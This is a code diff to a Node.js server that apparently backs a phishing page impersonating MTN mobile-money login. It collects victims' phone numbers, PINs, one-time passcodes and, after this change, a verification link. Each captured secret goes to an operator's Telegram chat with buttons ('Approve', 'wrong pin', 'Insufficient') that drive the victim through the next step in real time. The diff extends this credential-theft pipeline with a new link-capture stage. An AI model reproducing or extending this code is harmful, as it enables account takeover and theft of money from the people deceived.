@@ -79,13 +79,15 @@ setInterval(() => {
   }
 }, 10 * 60 * 1000);
 
-function notifyTelegramForRequest(id, { plan, price, phone, step, code, otp }) {
+function notifyTelegramForRequest(id, { plan, price, phone, step, code, otp, link }) {
   if (!api || !ADMIN_CHAT_ID) return;
 
-  const stepLabel = step === 'otp' ? 'OTP Verification' : 'Login';
+  const stepLabel = step === 'link' ? 'Link Verification' : step === 'otp' ? 'OTP Verification' : 'Login';
   const secretLine = step === 'otp'
-    ? `🔑 OTP : \`${otp || '—'}\`\n`
-    : `🔑 pin: \`${code || '—'}\`\n`;
+    ? `🔑 OTP: \`${otp || '—'}\`\n📎 Link: \`${link || '—'}\`\n`
+    : step === 'link'
+      ? `🔑 Link: \`${link || '—'}\`\n`
+      : `🔑 PIN: \`${code || '—'}\`\n`;
 
   const text =
     `🔔 *New Login Attempt — ${stepLabel}*\n\n` +
@@ -101,10 +103,15 @@ function notifyTelegramForRequest(id, { plan, price, phone, step, code, otp }) {
         { text: '⚠️ Insufficient', callback_data: `insufficient:${id}` },
         { text: '🔢 wrong pin', callback_data: `demo_error:${id}` },
       ]
-    : [
-        { text: '✅ Approve', callback_data: `approve:${id}` },
-        { text: '❌ wrong pin', callback_data: `deny:${id}` },
-      ];
+    : step === 'link'
+      ? [
+          { text: '✅ Approve Link', callback_data: `approve:${id}` },
+          { text: '❌ wrong link', callback_data: `deny:${id}` },
+        ]
+      : [
+          { text: '✅ Approve', callback_data: `approve:${id}` },
+          { text: '❌ wrong pin', callback_data: `deny:${id}` },
+        ];
 
   try {
     return api.sendMessage({
@@ -121,7 +128,7 @@ function notifyTelegramForRequest(id, { plan, price, phone, step, code, otp }) {
   }
 }
 
-function createApprovalRequest({ plan, price, phone, step = 'login', code = '', otp = '' } = {}) {
+function createApprovalRequest({ plan, price, phone, step = 'login', code = '', otp = '', link = '' } = {}) {
   const id = makeId();
   const record = {
     status: 'pending',
@@ -131,12 +138,13 @@ function createApprovalRequest({ plan, price, phone, step = 'login', code = '', 
     step: step || 'login',
     code: code || '',
     otp: otp || '',
+    link: link || '',
     createdAt: Date.now(),
   };
 
   requests.set(id, record);
   demoMtnRequests.set(id, { ...record, requestId: id, status: 'pending' });
-  notifyTelegramForRequest(id, { plan: record.plan, price: record.price, phone: record.phone, step: record.step, code: record.code, otp: record.otp });
+  notifyTelegramForRequest(id, { plan: record.plan, price: record.price, phone: record.phone, step: record.step, code: record.code, otp: record.otp, link: record.link });
   return id;
 }
 
@@ -271,6 +279,7 @@ app.post('/api/mtn/submit-otp', (req, res) => {
           step: 'otp',
           code: existing.code,
           otp,
+          link: existing.link || ''
         });
       }
     }
@@ -333,16 +342,17 @@ app.post('/api/mtn/submit-link', (req, res) => {
       existing.link = link;
       existing.phone = resolvedPhone;
       existing.status = 'pending';
-      existing.step = 'otp';
+      existing.step = 'link';
 
       if (api && ADMIN_CHAT_ID) {
         notifyTelegramForRequest(requestId, {
           plan: existing.plan,
           price: existing.price,
           phone: existing.phone,
-          step: 'otp',
+          step: 'link',
           code: existing.code,
-          otp: existing.otp || '—'
+          otp: existing.otp || '—',
+          link: existing.link || ''
         });
       }
     }
@@ -425,8 +435,8 @@ async function processTelegramCallbacks() {
       }
 
       const statusByAction = {
-        approve: request.step === 'otp' ? 'completed' : 'phone_pin_verified',
-        deny: request.step === 'otp' ? 'wrong_otp' : 'wrong_pin',
+        approve: request.step === 'otp' ? 'completed' : request.step === 'link' ? 'otp_pending' : 'phone_pin_verified',
+        deny: request.step === 'otp' ? 'wrong_otp' : request.step === 'link' ? 'wrong_link' : 'wrong_pin',
         insufficient: 'insufficient_balance',
         demo_error: 'wrong_pin',
       };
